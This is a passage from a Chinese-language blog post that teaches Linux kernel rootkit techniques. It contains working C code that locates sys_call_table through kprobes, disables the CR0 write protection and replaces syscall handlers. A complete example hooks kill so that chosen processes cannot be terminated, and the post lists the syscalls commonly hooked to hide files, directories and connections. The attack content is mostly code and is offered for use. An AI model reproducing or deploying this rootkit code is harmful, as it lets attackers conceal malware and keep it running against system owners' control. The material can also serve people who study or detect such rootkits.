<span class="w">    </span>list_add<span class="o">(</span><span class="p">&amp;</span>hc-&gt;list,<span class="w"> </span><span class="p">&amp;</span>hidden_conn_list<span class="o">)</span><span class="p">;</span>
<span class="o">}</span>
</code></pre></div>
<h5>怎么HOOK与HOOK哪些函数</h5>
<p>在内核之中，存在一个系统调用表。其中的系统调用编号（系统调用发生时rax的值）是其Handler在其表中的偏移量。
系统调用表位于sys_call_table，它是系统内核的一块区间，其作用是将调用号和服务函数连接起来，当系统调用某一个syscall，就会通过sys_call_table查找到该服务函数。</p>
<p>系统调用表是只读的，在内核中，CR0是一个控制寄存器，可以修改处理器的操作方式。其中的第16位是写保护标志所在的位置，如果该标志为0，CPU就可以让内核写入只读区域。Linux为我们提供了两个很有帮助的函数，可以用于修改CR0寄存器，分别是write_cr0和read_cr0。</p>
<p>这段代码的功能主要是找到sys_call_table的地址，由于内核版本不同，新版本内核用到了kprobe：</p>
<ul>
<li>获取kallsyms_lookup_name函数的地址，用于后续查找内核符号。</li>
<li>查找并获取sys_call_table的地址，用于系统调用表的修改。</li>
</ul>
<div class="highlight"><pre><span></span><code>int<span class="w"> </span>sys_call_table_init<span class="o">(</span>void<span class="o">)</span><span class="w"> </span><span class="o">{</span>
<span class="w">    </span>/*<span class="w"> </span>lookup<span class="w"> </span>address<span class="w"> </span>of<span class="w"> </span>kallsyms_lookup_name<span class="o">()</span><span class="w"> </span>*/
<span class="c1">#if LINUX_VERSION_CODE &gt;= KERNEL_VERSION(5, 7, 0)</span>
<span class="w">    </span>struct<span class="w"> </span>kprobe<span class="w"> </span><span class="nv">kp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">{</span>.symbol_name<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"kallsyms_lookup_name"</span><span class="o">}</span><span class="p">;</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="o">(</span>register_kprobe<span class="o">(</span><span class="p">&amp;</span>kp<span class="o">)</span><span class="w"> </span>&lt;<span class="w"> </span><span class="m">0</span><span class="o">)</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span>-EFAULT<span class="p">;</span>
<span class="w">    </span><span class="nv">kallsyms_lookup_name_ref</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">(</span>kallsyms_lookup_name_t<span class="o">)</span>kp.addr<span class="p">;</span>
<span class="w">    </span>unregister_kprobe<span class="o">(</span><span class="p">&amp;</span>kp<span class="o">)</span><span class="p">;</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="o">(</span>!kallsyms_lookup_name_ref<span class="o">)</span><span class="w"> </span><span class="o">{</span>
<span class="w">        </span>pr_err<span class="o">(</span>LOG_PREFIX<span class="w"> </span><span class="s2">"failed to lookup function kallsyms_lookup_name()\n"</span><span class="o">)</span><span class="p">;</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span>-EFAULT<span class="p">;</span>
<span class="w">    </span><span class="o">}</span>
<span class="c1">#else</span>
<span class="w">    </span><span class="nv">kallsyms_lookup_name_ref</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>kallsyms_lookup_name<span class="p">;</span>
<span class="c1">#endif</span>

<span class="w">    </span>/*<span class="w"> </span>lookup<span class="w"> </span>address<span class="w"> </span>of<span class="w"> </span>sys_call_table<span class="w"> </span>*/
<span class="w">    </span><span class="nv">sys_call_table_ref</span><span class="w"> </span><span class="o">=</span>
<span class="w">        </span><span class="o">(</span>t_syscall<span class="w"> </span>*<span class="o">)</span>kallsyms_lookup_name_ref<span class="o">(</span><span class="s2">"sys_call_table"</span><span class="o">)</span><span class="p">;</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="o">(</span>!sys_call_table_ref<span class="o">)</span><span class="w"> </span><span class="o">{</span>
<span class="w">        </span>pr_err<span class="o">(</span>LOG_PREFIX<span class="w"> </span><span class="s2">"failed to lookup symbol: sys_call_table\n"</span><span class="o">)</span><span class="p">;</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span>-EFAULT<span class="p">;</span>
<span class="w">    </span><span class="o">}</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="m">0</span><span class="p">;</span>
<span class="o">}</span>
</code></pre></div>
<p>这段代码的功能是将系统调用表中的某个系统调用替换为自定义的函数:</p>
<ul>
<li>读取并保存当前CR0寄存器值。</li>
<li>将原系统调用保存到orig_fn。</li>
<li>修改CR0寄存器以允许写入系统调用表。</li>
<li>替换系统调用表中的指定系统调用为新函数。</li>
<li>恢复CR0寄存器值。</li>
</ul>
<div class="highlight"><pre><span></span><code>static<span class="w"> </span>inline<span class="w"> </span>void<span class="w"> </span>write_cr0_forced<span class="o">(</span>unsigned<span class="w"> </span>long<span class="w"> </span>val<span class="o">)</span><span class="w"> </span><span class="o">{</span>
<span class="w">    </span>unsigned<span class="w"> </span>long<span class="w"> </span>__force_order<span class="p">;</span>
<span class="w">    </span>asm<span class="w"> </span>volatile<span class="o">(</span><span class="s2">"mov %0, %%cr0"</span><span class="w"> </span>:<span class="w"> </span><span class="s2">"+r"</span><span class="o">(</span>val<span class="o">)</span>,<span class="w"> </span><span class="s2">"+m"</span><span class="o">(</span>__force_order<span class="o">))</span><span class="p">;</span>
<span class="o">}</span>

void<span class="w"> </span>hook_sys_call_table<span class="o">(</span>long<span class="w"> </span>int<span class="w"> </span>sysno,<span class="w"> </span>t_syscall<span class="w"> </span>hook_fn,
<span class="w">                         </span>t_syscall<span class="w"> </span>*orig_fn<span class="o">)</span><span class="w"> </span><span class="o">{</span>
<span class="w">    </span>unsigned<span class="w"> </span>long<span class="w"> </span>cr0<span class="p">;</span>
<span class="w">    </span>pr_info<span class="o">(</span>LOG_PREFIX<span class="w"> </span><span class="s2">"hook syscall number %ld"</span>,<span class="w"> </span>sysno<span class="o">)</span><span class="p">;</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="o">(</span>!sys_call_table_ref<span class="o">)</span><span class="w"> </span><span class="o">{</span>
<span class="w">        </span>pr_warn<span class="o">(</span>LOG_PREFIX
<span class="w">                </span><span class="s2">"address of sys_call_table was not found, skip hook\n"</span><span class="o">)</span><span class="p">;</span>
<span class="w">        </span><span class="k">return</span><span class="p">;</span>
<span class="w">    </span><span class="o">}</span>
<span class="w">    </span><span class="nv">cr0</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>read_cr0<span class="o">()</span><span class="p">;</span>
<span class="w">    </span>*orig_fn<span class="w"> </span><span class="o">=</span><span class="w"> </span>sys_call_table_ref<span class="o">[</span>sysno<span class="o">]</span><span class="p">;</span>
<span class="w">    </span>write_cr0_forced<span class="o">(</span>cr0<span class="w"> </span><span class="p">&amp;</span><span class="w"> </span>~0x00010000<span class="o">)</span><span class="p">;</span>
<span class="w">    </span>sys_call_table_ref<span class="o">[</span>sysno<span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>hook_fn<span class="p">;</span>
<span class="w">    </span>write_cr0_forced<span class="o">(</span>cr0<span class="o">)</span><span class="p">;</span>
<span class="o">}</span>
</code></pre></div>
<p>下面完整展示了， HOOK __NR_kill(62)指向的函数，防止特定进程被SIGKILL或SIGTERM信号终止：</p>
<ul>
<li>protect_proccess：检查是否阻止对指定PID发送SIGKILL或SIGTERM信号。</li>
<li>hook_sys_kill：钩住系统调用sys_kill，先调用protect_proccess，若返回1则不执行原系统调用并返回0；否则执行原系统调用。</li>
<li>protect_proc_init：初始化时将sys_kill替换为hook_sys_kill。</li>
</ul>
<div class="highlight"><pre><span></span><code>static<span class="w"> </span>int<span class="w"> </span>protect_proccess<span class="o">(</span>pid_t<span class="w"> </span>pid,int<span class="w"> </span>sig<span class="o">){</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="o">(</span><span class="nv">sig</span><span class="w"> </span><span class="o">==</span><span class="w"> </span>SIGKILL<span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="nv">sig</span><span class="w"> </span><span class="o">==</span><span class="w"> </span>SIGTERM<span class="o">){</span>
<span class="w">        </span>struct<span class="w"> </span>protect_proc_info<span class="w"> </span>*pos<span class="p">;</span>
<span class="w">        </span>list_for_each_entry<span class="o">(</span>pos,<span class="p">&amp;</span>protect_proc_info_list,list<span class="o">)</span><span class="w"> </span><span class="o">{</span>
<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="o">(</span>pos-&gt;pid<span class="w"> </span><span class="o">==</span><span class="w"> </span>pid<span class="o">){</span>
<span class="w">                </span>pr_info<span class="o">(</span>LOG_PREFIX<span class="w"> </span><span class="s2">"prevent user kill pid %d,QWQ...\n"</span>,pid<span class="o">)</span><span class="p">;</span>
<span class="w">                </span><span class="k">return</span><span class="w"> </span><span class="m">1</span><span class="p">;</span>
<span class="w">            </span><span class="o">}</span>
<span class="w">        </span><span class="o">}</span>
<span class="w">    </span><span class="o">}</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="m">0</span><span class="p">;</span>
<span class="o">}</span>

static<span class="w"> </span>asmlinkage<span class="w"> </span>long<span class="w"> </span><span class="o">(</span>*orig_sys_kill<span class="o">)(</span>const<span class="w"> </span>struct<span class="w"> </span>pt_regs<span class="w"> </span>*<span class="o">)</span><span class="p">;</span>

asmlinkage<span class="w"> </span>long<span class="w"> </span>hook_sys_kill<span class="o">(</span>const<span class="w"> </span>struct<span class="w"> </span>pt_regs<span class="w"> </span>*regs<span class="o">)</span>
<span class="o">{</span>
<span class="w">    </span>pid_t<span class="w"> </span><span class="nv">pid</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>regs-&gt;di<span class="p">;</span>
<span class="w">    </span>int<span class="w"> </span><span class="nv">sig</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>regs-&gt;si<span class="p">;</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="o">(</span>protect_proccess<span class="o">(</span>pid,sig<span class="o">)){</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="m">0</span><span class="p">;</span>
<span class="w">    </span><span class="o">}</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span>orig_sys_kill<span class="o">(</span>regs<span class="o">)</span><span class="p">;</span>
<span class="o">}</span>



int<span class="w"> </span>protect_proc_init<span class="o">()</span><span class="w"> </span><span class="o">{</span>
<span class="w">    </span>pr_info<span class="o">(</span>LOG_PREFIX<span class="w"> </span><span class="s2">"call protect_proc_init()\n"</span><span class="o">)</span><span class="p">;</span>
<span class="w">    </span>hook_sys_call_table<span class="o">(</span>__NR_kill,<span class="w"> </span>hook_sys_kill,<span class="w"> </span><span class="p">&amp;</span>orig_sys_kill<span class="o">)</span><span class="p">;</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="m">0</span><span class="p">;</span>
<span class="o">}</span>
</code></pre></div>
<p>常用被HOOK的syscall 有如下：  </p>
<div class="highlight"><pre><span></span><code>open：打开文件。
宏定义：__NR_open
调用号（x86_64）：2

read：从文件读取数据。
宏定义：__NR_read
调用号（x86_64）：0

unlink：删除文件。
宏定义：__NR_unlink
调用号（x86_64）:<span class="w"> </span><span class="m">87</span>

getdents64：读取目录内容（64位版本）。
宏定义：__NR_getdents64
调用号（x86_64）:<span class="w"> </span><span class="m">78</span>

kill：发送信号给进程。
宏定义：__NR_kill
调用号（x86_64）：62

connect：发起连接请求。
宏定义：__NR_connect
调用号（x86_64）:<span class="w"> </span><span class="m">42</span>

execve：执行新程序。
宏定义：__NR_execve
调用号（x86_64）：59
</code></pre></div>
<p>HOOK 的方法，跟上面大同小异， 就不在赘述。</p>
  </div>
</article>
<div id="cyReward" role="cylabs" data-use="reward" style="text-align:center;"></div>
<!--PC和WAP自适应版-->
<div id="SOHUCS" ></div> 
<script type="text/javascript"> 
(function(){ 
var appid = 'cysYUIjwy'; 
var conf = 'prod_71b5e53cad0d27b5ed44fa5219b069b5'; 
var width = window.innerWidth || document.documentElement.clientWidth; 
if (width < 960) { 
window.document.write('<script id="changyan_mobile_js" charset="utf-8" type="text/javascript" src="https://changyan.sohu.com/upload/mobile/wap-js/changyan_mobile.js?client_id=' + appid + '&conf=' + conf + '"><\/script>'); } else { var loadJs=function(d,a){var c=document.getElementsByTagName("head")[0]||document.head||document.documentElement;var b=document.createElement("script");b.setAttribute("type","text/javascript");b.setAttribute("charset","UTF-8");b.setAttribute("src",d);if(typeof a==="function"){if(window.attachEvent){b.onreadystatechange=function(){var e=b.readyState;if(e==="loaded"||e==="complete"){b.onreadystatechange=null;a()}}}else{b.onload=a}}c.appendChild(b)};loadJs("https://changyan.sohu.com/upload/changyan.js",function(){window.changyan.api.config({appid:appid,conf:conf})}); } })(); </script>

<script type="text/javascript" charset="utf-8" src="https://changyan.itc.cn/js/lib/jquery.js"></script>
<script type="text/javascript" charset="utf-8" src="https://changyan.sohu.com/js/changyan.labs.https.js?appid=cysYUIjwy"></script>    </div>
  </div>

  <footer class="footer">
    <div class="container">
      <div class="row">
       <ul class="col-sm-6 list-inline">
          <li class="list-inline-item"><a href="https://www.njcx.bid/authors.html">Authors</a></li>
          <li class="list-inline-item"><a href="https://www.njcx.bid/archives.html">Archives</a></li>
          <li class="list-inline-item"><a href="https://www.njcx.bid/categories.html">Categories</a></li>
          <li class="list-inline-item"><a href="https://www.njcx.bid/tags.html">Tags</a></li>
        </ul>
        <p class="col-sm-6 text-sm-right text-muted">
          本站由 <a href="https://github.com/getpelican/pelican" target="_blank">Pelican 生成</a> 后续 by <a href="https://github.com/njcx" target="_blank">nJcx</a>
        </p>
      </div>
    </div>
  </footer>
</body>

</html>